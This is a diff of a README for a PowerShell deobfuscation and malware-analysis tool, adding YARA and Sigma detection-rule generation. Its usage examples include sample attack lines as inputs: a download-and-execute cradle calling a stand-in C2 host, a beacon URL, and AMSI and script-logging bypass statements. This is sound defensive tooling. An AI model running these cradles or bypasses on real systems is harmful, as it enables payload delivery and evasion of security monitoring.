@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/maya-thorne/powershell-ast-deobfuscator"><img src="https://img.shields.io/badge/Release-v0.14.0-blue.svg?style=flat-square" alt="Release v0.14.0" /></a>
+  <a href="https://github.com/maya-thorne/powershell-ast-deobfuscator"><img src="https://img.shields.io/badge/Release-v0.15.0-blue.svg?style=flat-square" alt="Release v0.15.0" /></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/License-MT--SRL-emerald.svg?style=flat-square" alt="License MT-SRL" /></a>
   <a href="ROADMAP.md"><img src="https://img.shields.io/badge/Roadmap-Active-purple.svg?style=flat-square" alt="Roadmap Active" /></a>
   <a href="SECURITY.md"><img src="https://img.shields.io/badge/Security-Policy-red.svg?style=flat-square" alt="Security Policy" /></a>
@@ -61,6 +61,7 @@ The deobfuscation engine executes a multi-pass fixed-point reduction loop:
 17. **Fixed-Point Convergence (`src/deobfuscator_engine.py`)**: Iterates reduction passes until the code reaches a stable, non-mutating fixed point.
 18. **DownloadString &amp; WebClient API URL Carving (`src/webclient_tracer.py`)**: Statically traces and extracts remote payload download cradles, decodes obfuscated DWORD/hex/octal IPs, binds headers and proxies, and outputs normalized URLs.
 19. **Automated Benchmark Harness &amp; Telemetry (`src/benchmark.py`)**: Runs evaluation over a 30-sample corpus across 10 categories, calculating Shannon entropy, artifact removal, ground-truth indicator recall, and composite fidelity score.
+20. **YARA &amp; Sigma Threat Hunting Rule Synthesizer (`src/threat_rule_generator.py`)**: Extracts high-fidelity indicators (C2 URLs, AMSI/ETW hooks, memory injection APIs, execution cradles, persistence mechanisms) across raw and AST-deobfuscated payloads, synthesizing correlated YARA 4.x rules and SigmaHQ YAML detection rules targeting ScriptBlock Logging (EID 4104), Module Logging (EID 4103), and Process Creation (EID 4688).
 
 
 ---
@@ -114,6 +115,9 @@ The deobfuscation engine executes a multi-pass fixed-point reduction loop:
 | **amsiInitFailed Reflection Tampering** | `[Ref].Assembly.GetType('...AmsiUtils').GetField('amsiInitFailed', ...).SetValue($null, $true)` | Forensic finding `AMSI-REFL-001` (amsiInitFailed Reflection Tampering, Critical) |
 | **cachedGroupPolicySettings Tampering** | `[Utils].GetField('cachedGroupPolicySettings', ...).GetValue($null)['ScriptBlockLogging'] = 0` | Forensic finding `LOG-REFL-001` (cachedGroupPolicySettings Reflection Tampering) |
 | **Forensic Neutralization &amp; Sanitization** | `pwsh-ast malware.ps1 --neutralize-amsi` | Active bypass statements sanitized into `<# [NEUTRALIZED: ...] ... #>` comments |
+| **YARA 4.x Threat Rule Synthesis** | `pwsh-ast malware.ps1 --generate-yara` | Synthesizes high-fidelity YARA rules with category prefixes, hex byte patterns, and condition trees |
+| **SigmaHQ Detection Rule Generation** | `pwsh-ast malware.ps1 --generate-sigma` | Generates standardized Sigma YAML rules for EID 4104 (ScriptBlock), EID 4103, and EID 4688 |
+| **Correlated Threat Ruleset Bundle** | `pwsh-ast malware.ps1 --generate-rules --rule-target dual` | Emits correlated YARA/Sigma bundle with dual-mode raw/deobfuscated strings and MITRE tags |
 
 ---
 
@@ -151,9 +155,14 @@ The deobfuscation engine executes a multi-pass fixed-point reduction loop:
 | `src/iex_unwrapper.py` | Recursive IEX (Invoke-Expression) wrapper tracking, peeling engine &amp; execution layer telemetry |
 | `src/amsi_etw_signatures.py` | AMSI &amp; ETW bypass detection ruleset, categories, severity tiers &amp; finding data models |
 | `src/amsi_etw_detector.py` | Memory patch &amp; reflection tampering detector, forensic telemetry, and surgical neutralization engine |
-| `src/deobfuscator_engine.py` | Multi-pass fixed-point convergence engine with AMSI/ETW bypass integration |
-| `src/cli.py` | Command-line interface with AST visualization, benchmark runner, URL carver, AMSI/ETW scanner &amp; forensic telemetry |
-| `tests/` | Comprehensive test suite (369 unit tests) covering lexer, parser, normalizer, crypto, URL carving, IEX peeling &amp; AMSI/ETW detector |
+| `src/rule_models.py` | Threat indicator taxonomy, MITRE ATT&CK catalog, rule metadata &amp; synthesis options |
+| `src/indicator_extractor.py` | High-fidelity IoC &amp; behavioral threat indicator extractor from raw &amp; AST deobfuscated code |
+| `src/yara_generator.py` | YARA 4.x detection rule synthesizer with category string prefixes, hex byte patterns &amp; balanced conditions |
+| `src/sigma_generator.py` | SigmaHQ YAML detection rule generator for ScriptBlock Logging (EID 4104) &amp; Process Creation (EID 4688) |
+| `src/threat_rule_generator.py` | Unified threat hunting facade coordinating indicator extraction, YARA &amp; Sigma rule synthesis |
+| `src/deobfuscator_engine.py` | Multi-pass fixed-point convergence engine with AMSI/ETW bypass integration &amp; threat rule generation |
+| `src/cli.py` | Command-line interface with AST visualization, benchmark runner, URL carver, AMSI/ETW scanner, YARA/Sigma synthesizer &amp; forensic telemetry |
+| `tests/` | Comprehensive test suite (396 unit tests) covering lexer, parser, normalizer, crypto, URL carving, IEX peeling, AMSI/ETW detector &amp; threat rule generation |
 | `ROADMAP.md` | Public development milestones and engineering roadmap |
 | `SECURITY.md` | Vulnerability disclosure policy and reporting process |
 
@@ -168,10 +177,10 @@ Run the full automated test suite:
 python -m unittest discover tests -v
 ```
 
-All 369 unit tests execute with zero failures:
+All 396 unit tests execute with zero failures:
 
 ```text
-Ran 369 tests in 0.243s
+Ran 396 tests in 0.704s
 
 OK
 ```
@@ -280,12 +289,37 @@ python -m src.cli sample.ps1 --detect-amsi
 python -m src.cli sample.ps1 --neutralize-amsi -o sanitized_sample.ps1
 ```
 
+#### YARA &amp; Sigma Threat Hunting Rule Synthesis
+
+Synthesize high-fidelity detection rules from deobfuscated payload indicators:
+
+```bash
+# Generate compliant YARA 4.x detection rule to stdout
+python -m src.cli sample.ps1 --generate-yara
+
+# Generate YARA rule with custom rule identifier and output file
+python -m src.cli sample.ps1 --generate-yara --rule-name "Emotet_Downloader_Stage" -o emotet.yar
+
+# Generate SigmaHQ YAML rule targeting PowerShell ScriptBlock Logging (EID 4104)
+python -m src.cli sample.ps1 --generate-sigma --sigma-logsource scriptblock -o sigma_rule.yml
+
+# Generate SigmaHQ YAML rule targeting Process Creation (EID 4688 / Sysmon 1)
+python -m src.cli sample.ps1 --generate-sigma --sigma-logsource process_creation
+
+# Generate complete correlated threat hunting bundle (YARA + Sigma + telemetry JSON)
+python -m src.cli sample.ps1 --generate-rules --rule-target dual
+
+# Save both .yar and .yml rules into a dedicated rules directory
+python -m src.cli sample.ps1 --generate-rules --rule-output-dir rules/
+```
+
 ### Python API
 
 ```python
 from src.deobfuscator_engine import PowerShellDeobfuscator
 from src.iex_unwrapper import unwrap_iex, trace_iex_layers
 from src.amsi_etw_detector import detect_amsi_etw, neutralize_amsi_etw
+from src.threat_rule_generator import ThreatRuleGenerator, generate_yara_rule, generate_sigma_rule
 from src.ast_visualizer import render_ast_tree
 from src.ast_exporter import export_ast_mermaid, export_ast_json, extract_ast_metrics
 from src.benchmark import run_benchmark, to_text_report, to_markdown_report
@@ -298,38 +332,53 @@ cleaned_code = engine.deobfuscate(raw_code)
 print(cleaned_code)
 # Output: Invoke-Expression 'DownloadString'
 
-# 2. Recursive IEX Peeling & Layer Telemetry
+# 2. Automated YARA & Sigma Threat Hunting Rule Generation
+script = "(New-Object Net.WebClient).DownloadString('http://c2.threat.net/stage.ps1') | IEX"
+
+# Generate YARA 4.x rule
+yara_rule = engine.generate_yara_rule(script)
+print(yara_rule)
+
+# Generate SigmaHQ YAML rule (ScriptBlock Logging EID 4104)
+sigma_rule = engine.generate_sigma_rule(script)
+print(sigma_rule)
+
+# Generate full ruleset bundle with indicator extraction telemetry
+ruleset = engine.generate_threat_rules(script)
+print(f"Total Indicators: {ruleset['summary']['total_indicators']}, Severity: {ruleset['summary']['severity']}")
+
+# 3. Recursive IEX Peeling & Layer Telemetry
 result = unwrap_iex("iex (iex (iex 'calc.exe'))")
 print(f"Peeled: {result.code}, Layers: {result.total_layers_peeled}")
 # Output: Peeled: 'calc.exe', Layers: 3
 
-# 3. AMSI & ETW Bypass Detection and Neutralization
+# 4. AMSI & ETW Bypass Detection and Neutralization
 findings = detect_amsi_etw("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
 for f in findings:
     print(f"[{f.severity}] {f.signature_id}: {f.signature_name} ({f.target_symbol})")
 
 sanitized = neutralize_amsi_etw(raw_code, mode="comment")
 
-# 4. Automated Benchmark Harness Execution
+# 5. Automated Benchmark Harness Execution
 summary = run_benchmark()
 print(f"Fidelity Score: {summary.average_fidelity_score}%, Recall: {summary.average_indicator_recall * 100.0}%")
 print(to_text_report(summary))
 
-# 5. Remote Payload URL Carving & WebClient Tracing
+# 6. Remote Payload URL Carving & WebClient Tracing
 targets = trace_webclient("(New-Object Net.WebClient).DownloadString('http://2130706433:8080/beacon.ps1')")
 for t in targets:
     print(f"URL: {t.url}, Host: {t.host}, IP Decoded: {t.ip_decoded}, Cradle: {t.cradle_type}")
 # Output: URL: http://127.0.0.1:8080/beacon.ps1, Host: 127.0.0.1, IP Decoded: 2130706433 -> 127.0.0.1, Cradle: iex_download_string
 
-# 6. AST Visualization
+# 7. AST Visualization
 tree = render_ast_tree("$x = 'test' + 'ing'")
 print(tree)
 
-# 7. Export to Mermaid diagram
+# 8. Export to Mermaid diagram
 mermaid_diagram = export_ast_mermaid("if ($true) { Get-Process }")
 print(mermaid_diagram)
 
-# 8. Extract structural metrics
+# 9. Extract structural metrics
 metrics = extract_ast_metrics("Get-Process | Out-String")
 print(f"Total nodes: {metrics['total_nodes']}, Cyclomatic complexity: {metrics['cyclomatic_complexity']}")
 ```
